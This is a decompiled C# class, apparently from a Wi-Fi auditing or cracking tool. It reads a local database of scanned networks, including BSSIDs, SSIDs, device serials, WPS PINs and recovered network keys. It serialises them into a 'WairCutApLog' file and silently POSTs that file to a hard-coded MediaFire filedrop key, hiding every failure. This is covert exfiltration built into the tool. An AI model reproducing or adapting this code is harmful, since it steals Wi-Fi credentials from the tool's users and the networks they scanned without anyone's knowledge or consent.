using System;
using System.Collections.Generic;
using System.Data.SQLite;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

// Token: 0x0200000E RID: 14
public class GClass1
{
	// Token: 0x06000163 RID: 355 RVA: 0x00006CD8 File Offset: 0x00004ED8
	public object method_0()
	{
		object result;
		try
		{
			List<GClass1.GClass2> list = this.method_2();
			if (list.Count > 0)
			{
				Stream stream = this.method_1(ref list);
				this.method_4(string.Format("{0}_{1}.log", Class13.string_3, DateAndTime.Now.ToString("yy-MM-dd_HH-mm-ss")), (MemoryStream)stream);
				try
				{
					foreach (GClass1.GClass2 gclass in list)
					{
						this.method_3(ref gclass);
					}
				}
				finally
				{
					List<GClass1.GClass2>.Enumerator enumerator;
					((IDisposable)enumerator).Dispose();
				}
			}
			result = true;
		}
		catch (Exception ex)
		{
			result = false;
		}
		return result;
	}

	// Token: 0x06000164 RID: 356 RVA: 0x00006DA0 File Offset: 0x00004FA0
	private Stream method_1(ref List<GClass1.GClass2> list_0)
	{
		Stream result;
		try
		{
			Stream stream = new MemoryStream();
			BinaryWriter binaryWriter = new BinaryWriter(stream);
			binaryWriter.Write("WairCutApLog".ToCharArray());
			binaryWriter.Write(1);
			binaryWriter.Write(Class13.string_3.Length);
			binaryWriter.Write(Class13.string_3.ToCharArray());
			binaryWriter.Write(Class13.string_2.Length);
			binaryWriter.Write(Class13.string_2.ToCharArray());
			binaryWriter.Write(DateAndTime.Now.ToString("yyyy/MM/dd HH:mm:ss").ToCharArray());
			binaryWriter.Write(list_0.Count);
			try
			{
				foreach (GClass1.GClass2 gclass in list_0)
				{
					binaryWriter.Write(gclass.string_0.Length);
					binaryWriter.Write(gclass.string_0.ToCharArray());
					binaryWriter.Write(gclass.string_1.Length);
					binaryWriter.Write(gclass.string_1.ToCharArray());
					binaryWriter.Write(gclass.string_2.Length);
					binaryWriter.Write(gclass.string_2.ToCharArray());
					binaryWriter.Write(gclass.string_3.Length);
					binaryWriter.Write(gclass.string_3.ToCharArray());
					binaryWriter.Write(gclass.string_4.Length);
					binaryWriter.Write(gclass.string_4.ToCharArray());
					binaryWriter.Write(gclass.string_5.Length);
					binaryWriter.Write(gclass.string_5.ToCharArray());
					binaryWriter.Write(gclass.string_6.Length);
					binaryWriter.Write(gclass.string_6.ToCharArray());
					binaryWriter.Write(gclass.string_7.Length);
					binaryWriter.Write(gclass.string_7.ToCharArray());
					binaryWriter.Write(gclass.string_8.Length);
					binaryWriter.Write(gclass.string_8.ToCharArray());
					binaryWriter.Write(gclass.string_9.Length);
					binaryWriter.Write(gclass.string_9.ToCharArray());
					binaryWriter.Write(gclass.string_10.Length);
					binaryWriter.Write(gclass.string_10.ToCharArray());
					binaryWriter.Write(gclass.string_11.Length);
					binaryWriter.Write(gclass.string_11.ToCharArray());
					binaryWriter.Write(gclass.string_12.Length);
					binaryWriter.Write(gclass.string_12.ToCharArray());
					binaryWriter.Write(gclass.string_13.Length);
					binaryWriter.Write(gclass.string_13.ToCharArray());
					binaryWriter.Write(gclass.string_14.Length);
					binaryWriter.Write(gclass.string_14.ToCharArray());
					binaryWriter.Write(gclass.int_0);
					binaryWriter.Write(gclass.int_1);
				}
			}
			finally
			{
				List<GClass1.GClass2>.Enumerator enumerator;
				((IDisposable)enumerator).Dispose();
			}
			binaryWriter.Close();
			result = stream;
		}
		catch (Exception ex)
		{
			result = null;
		}
		return result;
	}

	// Token: 0x06000165 RID: 357 RVA: 0x000070F8 File Offset: 0x000052F8
	private List<GClass1.GClass2> method_2()
	{
		SQLiteConnection sqliteConnection = new SQLiteConnection("Data Source=Bd\\ApLog.db;Version=3;");
		SQLiteCommand sqliteCommand = new SQLiteCommand("Select * From Networks where Know = 0 and Status = 1", sqliteConnection);
		List<GClass1.GClass2> list = new List<GClass1.GClass2>();
		try
		{
			sqliteConnection.Open();
			SQLiteDataReader sqliteDataReader = sqliteCommand.ExecuteReader();
			while (sqliteDataReader.Read())
			{
				GClass1.GClass2 gclass = new GClass1.GClass2();
				gclass.string_0 = sqliteDataReader["BSSID"].ToString();
				gclass.string_1 = sqliteDataReader["SSID"].ToString();
				gclass.string_2 = sqliteDataReader["DeviceName"].ToString();
				gclass.string_3 = sqliteDataReader["Manufacturer"].ToString();
				gclass.string_4 = sqliteDataReader["ModelName"].ToString();
				gclass.string_5 = sqliteDataReader["ModelNumber"].ToString();
				gclass.string_6 = sqliteDataReader["SerialNumber"].ToString();
				gclass.string_7 = sqliteDataReader["RFBand"].ToString();
				gclass.string_8 = sqliteDataReader["UUID"].ToString();
				gclass.string_9 = sqliteDataReader["Version"].ToString();
				gclass.string_10 = sqliteDataReader["Encryption"].ToString();
				gclass.string_11 = sqliteDataReader["ConfigMethods"].ToString();
				gclass.int_0 = Conversions.ToInteger(sqliteDataReader["Status"]);
				if (!Information.IsDBNull(RuntimeHelpers.GetObjectValue(sqliteDataReader["Pin"])) && Operators.CompareString(sqliteDataReader["Pin"].ToString(), "", false) != 0)
				{
					gclass.string_13 = sqliteDataReader["Pin"].ToString();
				}
				if (!Information.IsDBNull(RuntimeHelpers.GetObjectValue(sqliteDataReader["Key"])) && Operators.CompareString(sqliteDataReader["Key"].ToString(), "", false) != 0)
				{
					gclass.string_12 = sqliteDataReader["Key"].ToString();
				}
				gclass.int_1 = Conversions.ToInteger(sqliteDataReader["DecryptMode"]);
				list.Add(gclass);
			}
			sqliteDataReader.Close();
			sqliteCommand.Dispose();
			sqliteConnection.Close();
		}
		catch (Exception ex)
		{
		}
		return list;
	}

	// Token: 0x06000166 RID: 358 RVA: 0x00007368 File Offset: 0x00005568
	public void method_3(ref GClass1.GClass2 gclass2_0)
	{
		SQLiteConnection sqliteConnection = new SQLiteConnection("Data Source=Bd\\ApLog.db;Version=3;");
		SQLiteCommand sqliteCommand = new SQLiteCommand("Update Networks set Know=@Know where BSSID=@BSSID and SSID=@SSID", sqliteConnection);
		try
		{
			sqliteConnection.Open();
			sqliteCommand.Parameters.AddWithValue("@BSSID", gclass2_0.string_0);
			sqliteCommand.Parameters.AddWithValue("@SSID", gclass2_0.string_1);
			sqliteCommand.Parameters.AddWithValue("@Know", 1);
			sqliteCommand.ExecuteNonQuery();
			sqliteCommand.Dispose();
			sqliteConnection.Close();
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x06000167 RID: 359 RVA: 0x0000740C File Offset: 0x0000560C
	private bool method_4(string string_0, MemoryStream memoryStream_0)
	{
		int num = memoryStream_0.ToArray().Length;
		HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create("http://www.mediafire.com/api/1.4/upload/simple.php?filedrop_key=492214d7de748aafa049a2428a99157bbcd9afebb0c4189a0ec24c5c1d502c88");
		try
		{
			httpWebRequest.Method = "POST";
			httpWebRequest.KeepAlive = true;
			httpWebRequest.Headers.Add("action_on_duplicate", "keep");
			httpWebRequest.Headers.Add("response_format", "json");
			httpWebRequest.Headers.Add("x-filename", string_0);
			httpWebRequest.Headers.Add("x-filesize", num.ToString());
			httpWebRequest.ContentType = "application/octet-stream";
			httpWebRequest.ContentLength = (long)num;
			httpWebRequest.KeepAlive = false;
			Stream stream = httpWebRequest.GetRequestStream();
			stream.Write(memoryStream_0.ToArray(), 0, num);
			stream.Close();
			HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
			Console.WriteLine(httpWebResponse.StatusDescription);
			stream = httpWebResponse.GetResponseStream();
			StreamReader streamReader = new StreamReader(stream);
			streamReader.ReadToEnd();
			streamReader.Close();
			stream.Close();
			httpWebResponse.Close();
		}
		catch (Exception ex)
		{
		}
		return true;
	}

	// Token: 0x0200000F RID: 15
	public class GClass2
	{
		// Token: 0x06000168 RID: 360 RVA: 0x00007528 File Offset: 0x00005728
		public GClass2()
		{
			this.string_0 = "";
			this.string_1 = "";
			this.string_2 = "";
			this.string_3 = "";
			this.string_4 = "";
			this.string_5 = "";
			this.string_6 = "";
			this.string_7 = "";
			this.string_8 = "";
			this.string_9 = "";
			this.string_10 = "";
			this.string_11 = "";
			this.string_12 = "";
			this.string_13 = "";
			this.string_14 = "";
			this.int_0 = 0;
			this.int_1 = 0;
		}

		// Token: 0x0400005D RID: 93
		public string string_0;

		// Token: 0x0400005E RID: 94
		public string string_1;

		// Token: 0x0400005F RID: 95
		public string string_2;

		// Token: 0x04000060 RID: 96
		public string string_3;

		// Token: 0x04000061 RID: 97
		public string string_4;

		// Token: 0x04000062 RID: 98
		public string string_5;

		// Token: 0x04000063 RID: 99
		public string string_6;

		// Token: 0x04000064 RID: 100
		public string string_7;

		// Token: 0x04000065 RID: 101
		public string string_8;

		// Token: 0x04000066 RID: 102
		public string string_9;

		// Token: 0x04000067 RID: 103
		public string string_10;

		// Token: 0x04000068 RID: 104
		public string string_11;

		// Token: 0x04000069 RID: 105
		public string string_12;

		// Token: 0x0400006A RID: 106
		public string string_13;

		// Token: 0x0400006B RID: 107
		public string string_14;

		// Token: 0x0400006C RID: 108
		public int int_0;

		// Token: 0x0400006D RID: 109
		public int int_1;
	}
}
